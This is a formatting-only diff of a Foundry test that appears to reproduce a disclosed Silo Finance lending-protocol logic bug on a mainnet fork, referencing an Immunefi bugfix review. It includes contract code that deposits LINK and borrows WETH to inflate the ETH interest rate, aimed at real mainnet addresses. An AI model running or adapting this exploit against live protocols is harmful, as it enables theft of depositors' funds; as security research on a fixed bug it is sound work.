@@ -9,13 +9,15 @@ import "./interface.sol";
 // analysis and code: https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a
 
 interface ISilo {
-    function deposit(address _asset, uint256 _amount, bool _collateralOnly)
-        external
-        returns (uint256 collateralAmount, uint256 collateralShare);
+    function deposit(
+        address _asset,
+        uint256 _amount,
+        bool _collateralOnly
+    ) external returns (uint256 collateralAmount, uint256 collateralShare);
 
     function borrow(address _asset, uint256 _amount) external returns (uint256 debtAmount, uint256 debtShare);
 
-    function assetStorage(address _asset) external view returns (IBaseSilo.AssetStorage memory) ;
+    function assetStorage(address _asset) external view returns (IBaseSilo.AssetStorage memory);
 
     function accrueInterest(address _asset) external returns (uint256 interest);
 }
@@ -42,11 +44,10 @@ interface IBaseSilo {
 
 interface IShareToken {}
 
-contract OtherAccount{
-
+contract OtherAccount {
     ISilo immutable SILO;
-    IERC20 constant public WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 constant public LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
+    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
 
     address owner;
 
@@ -55,12 +56,13 @@ contract OtherAccount{
         SILO = _silo;
     }
 
-    modifier onlyOwner {
+    modifier onlyOwner() {
         require(msg.sender == owner);
         _;
     }
 
-    function depositLinkAndBorrowWETH() external onlyOwner { // This will inflate the ETH interest rate. 
+    function depositLinkAndBorrowWETH() external onlyOwner {
+        // This will inflate the ETH interest rate.
         uint256 depositAmount = LINK.balanceOf(address(this));
         LINK.approve(address(SILO), depositAmount);
         SILO.deposit(address(LINK), depositAmount, true);
@@ -69,19 +71,17 @@ contract OtherAccount{
     }
 }
 
-contract SiloBugFixReview{
-
+contract SiloBugFixReview {
     ISilo public constant SILO = ISilo(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C);
     IERC20 public constant XAI = IERC20(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc);
-    IERC20 constant public WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 constant public LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
+    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
 
     OtherAccount public immutable otherAccount;
 
     constructor() {
         otherAccount = new OtherAccount(SILO);
     }
-
 
     modifier checkZeroAssetStorage() {
         require(SILO.assetStorage(address(WETH)).totalDeposits == 0);
@@ -114,7 +114,6 @@ contract SiloBugFixReview{
     }
 }
 
-
 // forge test --match-path test/pocs/posterms/silo-finance/BugFixReview.t.sol -vvv
 contract SiloBugFixReviewTest is Test {
     uint256 mainnetFork;
@@ -124,11 +123,11 @@ contract SiloBugFixReviewTest is Test {
     uint256 constant depositAmount = 1e5;
     uint256 constant donatedAmount = 1e18;
 
-    uint256 otherAccountDepositAmount = 545*1e18;
+    uint256 otherAccountDepositAmount = 545 * 1e18;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17139470);
+        cheats.createSelectFork("mainnet", 17_139_470);
 
         siloBugFixReview = new SiloBugFixReview();
         deal(address(siloBugFixReview.WETH()), address(siloBugFixReview), depositAmount + donatedAmount);
@@ -140,12 +139,12 @@ contract SiloBugFixReviewTest is Test {
 
         address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
-        console.log("time stamp before = ",block.timestamp);
-        console.log("block number before = ",block.number);
+        console.log("time stamp before = ", block.timestamp);
+        console.log("block number before = ", block.number);
         siloBugFixReview.run();
         cheats.makePersistent(address(siloBugFixReview));
         cheats.makePersistent(address(siloBugFixReview.SILO()));
-        
+
         cheats.makePersistent(WETH);
         cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).collateralToken));
         cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).collateralOnlyToken));
@@ -158,8 +157,8 @@ contract SiloBugFixReviewTest is Test {
 
         cheats.rollFork(block.number + 1);
 
-        console.log("time stamp after = ",block.timestamp);
-        console.log("block number after = ",block.number);
+        console.log("time stamp after = ", block.timestamp);
+        console.log("block number after = ", block.number);
         siloBugFixReview.run2();
     }
 }
